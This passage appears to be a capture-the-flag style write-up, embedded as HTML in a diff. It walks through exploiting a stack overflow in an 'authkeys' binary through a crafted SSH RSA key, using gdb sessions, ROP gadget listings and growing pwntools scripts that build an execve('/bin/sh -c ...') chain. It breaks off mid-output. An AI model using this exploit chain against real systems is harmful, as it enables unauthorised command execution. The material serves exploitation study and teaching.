+(gdb) run 1 2 ssh-rsa QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc2QWc3QWc4QWc5QWgwQWgxQWgyQWgzQWg0QWg1QWg2QWg3QWg4QWg5QWkwQWkxQWkyQWkzQWk0QWk1QWk2QWk3QWk4QWk5QWowQWoxQWoyQWozQWo0QWo1QWo2QWo3QWo4QWo5QWswQWsxQWsyQWszQWs0QWs1QWs2QWs3QWs4QWs5QWwwQWwxQWwyQWwzQWw0QWw1QWw2QWw3QWw4QWw5QW0wQW0xQW0yQW0zQW00QW01QW02QW03QW04QW05QW4wQW4xQW4yQW4zQW40QW41QW42QW43QW44QW45QW8wQW8xQW8yQW8zQW80QW81QW82QW83QW84QW85QXAwQXAxQXAyQXAzQXA0QXA1QXA2QXA3QXA4QXA5QXEwQXExQXEyQXEzQXE0QXE1QXE2QXE3QXE4QXE5QXIwQXIxQXIyQXIzQXI0QXI1QXI2QXI3QXI4QXI5QXMwQXMxQXMyQXMzQXM0QXM1QXM2QXM3QXM4QXM5QXQwQXQxQXQyQXQzQXQ0QXQ1QXQ2QXQ3QXQ4QXQ5QXUwQXUxQXUyQXUzQXU0QXU1QXU2QXU3QXU4QXU5QXYwQXYxQXYyQXYzQXY0QXY1QXY2QXY3QXY4QXY5QXcwQXcxQXcyQXczQXc0QXc1QXc2QXc3QXc4QXc5QXgwQXgxQXgyQXgzQXg0QXg1QXg2QXg3QXg4QXg5QXkwQXkxQXkyQXkzQXk0QXk1QXk2QXk3QXk4QXk5QXowQXoxQXoyQXozQXo0QXo1QXo2QXo3QXo4QXo5QmEwQmExQmEyQmEzQmE0QmE1QmE2QmE3QmE4QmE5QmIwQmIxQmIyQmIzQmI0QmI1QmI2QmI3QmI4QmI5QmMwQmMxQmMyQmMzQmM0QmM1QmM2QmM3QmM4QmM5QmQwQmQxQmQyQmQzQmQ0QmQ1QmQ2QmQ3QmQ4QmQ5QmUwQmUxQmUyQmUzQmU0QmU1QmU2QmU3QmU4QmU5QmYwQmYxQmYyQmYzQmY0QmY1QmY2QmY3QmY4QmY5QmcwQmcxQmcyQmczQmc0Qmc1Qmc2Qmc3Qmc4Qmc5QmgwQmgxQmgyQgo=
+
+(gdb) c
+
+  Continuing.
+
+  Program received signal SIGSEGV, Segmentation fault.
+  0x000000000040036b in ?? ()
+
+(gdb) x/xg $rsp
+
+  0x7f7ffffd45d8:	0x42306142397a4138</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Checking at what offset in the buffer the return address was overwritten with:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ msf-pattern_offset -l 1000 -q 42306142397a4138
+
+  [*] Exact match at offset 776</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The return address is overwritten after 776 bytes!</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="5-4-starting-the-exploit-code">5.4 STARTING THE EXPLOIT CODE</h3>
+<div class="paragraph">
+<p>The payload offset is adjusted by 22 bytes for the added bytes by the SSH key constructor and another 8 bytes for the consideration of RBP and finally writing the new return address:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python">from Crypto.PublicKey import RSA
+from pwn import *
+
+# Public Key Generation=============================================
+
+def generateRSAPublicKey(payload):
+    n = int("".join([format(ord(x),"02x") for x in payload]),16)
+    print(RSA.construct((n, 65537)).exportKey(format="OpenSSH").decode("utf-8"))
+
+# Payload Buffer====================================================
+
+payload = ""
+payload += "A" * (768 - 22)	                # buffer
+payload += "B" * 8          			# rbp
+payload += "C" * 8                      # ret addr
+
+# Payload Generation================================================
+
+generateRSAPublicKey(payload)</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Checking in with gdb, the return address is now "CCCCCCCC":</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ python3 test.py
+
+  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAC+kFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkJCQkJCQkJDQ0NDQ0NDQw==</code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">(gdb) break * 0x00400361
+
+(gdb) run 1 2 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAC+kFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkJCQkJCQkJDQ0NDQ0NDQw==
+
+(gdb) c
+
+  Continuing.
+
+  Program received signal SIGSEGV, Segmentation fault.
+  0x000000000040036b in ?? ()
+
+(gdb) x/xg $rsp
+
+  0x7f7ffffd45d8:	0x4343434343434343</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+</div>
+<div class="sect2">
+<h3 id="5-5-rop-gadgets">5.5 ROP GADGETS</h3>
+<div class="paragraph">
+<p>There is a syscall instruction available so perhaps <strong><code>execve()</code></strong> may be an option:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ python3 -m ropper -f authkeys
+
+  0x00000000004003cf: syscall;
+  0x00000000004003cf: syscall; ret;</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Checking if there&#8217;s a way to control RAX, there are a few gadgets that can help set the desired value for the register:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ python3 -m ropper -f authkeys
+
+  0x0000000000400394: mov eax, 0xffffffff; xor rcx, rcx; ret;
+  0x000000000040036d: not al; adc cl, 0xe8; ret;
+  0x0000000000400370: shr eax, 1; ret;</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Finally, gadgets that can help set the values of RDI, RSI, and RDX which requires conversion from a single precision floating point value to an integer and a pointer assignment for RDX when used with <strong><code>movups</code></strong>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ python3 -m ropper -f authkeys
+
+  0x0000000000400380: cvtss2si esi, xmm0; ret;
+  0x0000000000400367: mov rdi, rsi; pop rdx; ret;
+  0x000000000040037c: movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
+  0x000000000040036a: pop rdx; ret;</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+</div>
+<div class="sect2">
+<h3 id="5-6-controlling-rax">5.6 CONTROLLING RAX</h3>
+<div class="paragraph">
+<p>The binary value of "3B" (execve syscall) is "111011". What will happen when <strong><code>mov eax, 0xffffffff; xor rcx, rcx; ret;</code></strong> is that RAX will be set to <strong><code>0xFFFFFFFF</code></strong> or <strong><code>11111111111111111111111111111111</code></strong>.</p>
+</div>
+<div class="paragraph">
+<p>From there we can use right bitshifts and the not operator to get the correct value but take note that the <strong><code>not al</code></strong> operator only converts the last two bytes so if our current value is the one mentioned earlier, <strong><code>0xFFFFFFFF</code></strong>, we need to shift the bits to the right 24 times to achieve <strong><code>0x000000FF</code></strong>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"># After shifting 24 bits:
+HEX         BINARY                              INSTRUCTION
+--------    --------------------------------    --------------------------
+000000FF    00000000000000000000000011111111
+0000007F    00000000000000000000000001111111    shr eax, 1; ret;
+00000080    00000000000000000000000010000000    not al; adc cl, 0xe8; ret;
+00000040    00000000000000000000000001000000    shr eax, 1; ret;
+00000020    00000000000000000000000000100000    shr eax, 1; ret;
+00000010    00000000000000000000000000010000    shr eax, 1; ret;
+000000EF    00000000000000000000000011101111    not al; adc cl, 0xe8; ret;
+00000077    00000000000000000000000001110111    shr eax, 1; ret;
+0000003B    00000000000000000000000000111011    shr eax, 1; ret;</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Translating the following into the exploit code:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python">from Crypto.PublicKey import RSA
+from pwn import *
+
+# Public Key Generation=============================================
+
+def generateRSAPublicKey(payload):
+    n = int("".join([format(ord(x),"02x") for x in payload]),16) + 1
+    print(RSA.construct((n, 65537)).exportKey(format="OpenSSH").decode("utf-8"))
+
+# Payload Buffer====================================================
+
+payload = ""
+payload += "A" * (768 - 22)	            # buffer
+payload += "B" * 8          			# rbp
+
+# Controlling RAX===================================================
+
+payload += p64(0x00400394)  			# mov eax, 0xffffffff; xor rcx, rcx; ret;
+for i in range(0,24):
+    payload += p64(0x00400370)  		# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x0040036d)  			# not al; adc cl, 0xe8; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x0040036d)  			# not al; adc cl, 0xe8; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+
+payload += p64(0)
+
+# Payload Generation================================================
+
+generateRSAPublicKey(payload)</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Now trying the new payload from exploit code:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ python test.py
+
+  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAEAkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkJCQkJCQkKUA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAAAAAAAAAAAAAQ==</code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">(gdb) break * 0x00400361
+
+(gdb) run 1 2 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAEAkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkJCQkJCQkKUA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAAAAAAAAAAAAAQ==
+
+(gdb) c
+
+  Continuing.
+
+  Program received signal SIGSEGV, Segmentation fault.
+  0x0000000000400372 in ?? ()
+
+(gdb) info register $rax
+
+  rax            0x3b	59</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The RAX register has been controlled!</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="5-7-controlling-rdi-rsi-and-rdx">5.7 CONTROLLING RDI, RSI, AND RDX</h3>
+<div class="paragraph">
+<p>These three registers will serve as the arguments for the execve function:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="c">int execve(const char *pathname, char *const argv[], char *const envp[]);</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Based on the OpenBSD sshd_config documentation:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<table class="tableblock frame-all grid-all stretch">
+<colgroup>
+<col style="width: 20%;">
+<col style="width: 40%;">
+<col style="width: 40%;">
+</colgroup>
+<tbody>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">RDI</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">const char *pathname</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">/bin/sh</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">RSI</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">char *const argv[]</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">["/bin/sh", "-c", "&lt;command&gt;"]</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">RDX</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">char *const envp[]</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">NULL</p></td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>However, controlling the three registers is a bit tricky using the following gadgets:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ python3 -m ropper -f authkeys
+
+  0x0000000000400380: cvtss2si esi, xmm0; ret;
+  0x0000000000400367: mov rdi, rsi; pop rdx; ret;
+  0x000000000040037c: movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
+  0x000000000040036a: pop rdx; ret;</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>To set the value of RDI, the process will go as follows:</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Set the value of RDX to be the pointer to the address of your intended RDI. The value of RDX should be a floating point number since it will be converted later on to the desired value.</p>
+</li>
+<li>
+<p>Convert the value of RDX from a single precision floating point number to an integer using the <strong><code>cvtss2si</code></strong> gadget which will set its value to RSI.</p>
+</li>
+<li>
+<p>Move the value to RDI from RSI.</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>I created a function to that will convert the address to its single precision floating point number equivalent:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python">def convertAddressToFP(address):
+
+    addr_int = int(str(address))
+    binary = ""
+    while addr_int > 0:
+        binary += str(addr_int % 2)
+        addr_int = int(addr_int/2)
+
+    binary = binary[::-1]
+    significant_left = binary.find("1")
+    decimal_adj = len(binary[significant_left+1:])
+    exponent_precision = 127 + decimal_adj
+    exponent = ""
+    while exponent_precision > 0:
+        exponent += str(exponent_precision % 2)
+        exponent_precision = int(exponent_precision/2)
+
+    exponent = exponent[::-1]
+    mantissa = binary[significant_left+1:].ljust(23,"0")
+    binary_string = "0" + exponent + mantissa
+
+    return int(binary_string, 2)</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>To set the value of RSI, just follow the steps above from 1 until 3. Finally, to set the value of RDX, there is simply a <strong><code>pop rdx; ret</code></strong> gadget available. With all this information, the exploit code has been modified to the following:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python">from Crypto.PublicKey import RSA
+from pwn import *
+
+# Floating Point Conversion=========================================
+
+def convertAddressToFP(address):
+
+    addr_int = int(str(address))
+    binary = ""
+    while addr_int > 0:
+        binary += str(addr_int % 2)
+        addr_int = int(addr_int/2)
+
+    binary = binary[::-1]
+    significant_left = binary.find("1")
+    decimal_adj = len(binary[significant_left+1:])
+    exponent_precision = 127 + decimal_adj
+    exponent = ""
+    while exponent_precision > 0:
+        exponent += str(exponent_precision % 2)
+        exponent_precision = int(exponent_precision/2)
+
+    exponent = exponent[::-1]
+    mantissa = binary[significant_left+1:].ljust(23,"0")
+    binary_string = "0" + exponent + mantissa
+
+    return int(binary_string, 2)
+
+# Public Key Generation=============================================
+
+def generateRSAPublicKey(payload):
+    n = int("".join([format(ord(x),"02x") for x in payload]),16) + 1
+    print(RSA.construct((n, 65537)).exportKey(format="OpenSSH").decode("utf-8"))
+
+# Command Execution Payload=========================================
+
+payload = ""
+payload += p64(convertAddressToFP(0x006010d6 + 0x30))
+payload += p64(convertAddressToFP(0x006010d6 + 0x10))
+payload += p64(0x006010d6 + 0x30)
+payload += p64(0x006010d6 + 0x38)
+payload += p64(0x006010d6 + 0x40)
+payload += p64(0)
+payload += "/bin/sh" + "\x00"
+payload += "-c" + ("\x00" * 6)
+payload += "echo $(id) > /tmp/jebidiah" + "\x00"        # TEST COMMAND
+
+# Payload Buffer====================================================
+
+payload += "A" * (768 - 22 - len(payload))	            # buffer
+payload += "B" * 8          			                # rbp
+
+# Controlling RAX===================================================
+
+payload += p64(0x00400394)  			# mov eax, 0xffffffff; xor rcx, rcx; ret;
+for i in range(0,24):
+    payload += p64(0x00400370)  		# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x0040036d)  			# not al; adc cl, 0xe8; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x0040036d)  			# not al; adc cl, 0xe8; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+payload += p64(0x00400370)  			# shr eax, 1; ret;
+
+# Controlling RDI, RSI, RDX=========================================
+
+payload += p64(0x0040036a)			    # pop rdx; ret;
+payload += p64(0x006010d6)			    # RDI -> Pointer to "/bin/sh"
+payload += p64(0x0040037c)			    # movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
+payload += p64(0x00400380)			    # cvtss2si esi, xmm0; ret;
+payload += p64(0x00400367)			    # mov rdi, rsi; pop rdx; ret;
+payload += p64(0x006010d6 + 0x08)	    # RSI -> Pointer to argv addresses
+payload += p64(0x0040037c)			    # movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
+payload += p64(0x00400380)			    # cvtss2si esi, xmm0; ret;
+payload += p64(0x0040036a)			    # pop rdx; ret;
+payload += p64(0)				        # RDX set to NULL
+
+payload += p64(0)
+
+# Payload Generation================================================
+
+generateRSAPublicKey(payload)</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ python test.py
+
+  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAEUgwiwEoAAAAAzCHASgAAAAAGEWAAAAAAAA4RYAAAAAAAFhFgAAAAAAAAAAAAAAAAAC9iaW4vc2gALWMAAAAAAABlY2hvICQoaWQpID4gL3RtcC9qZWJpZGlhaABBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkJCQkJCQkKUA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAc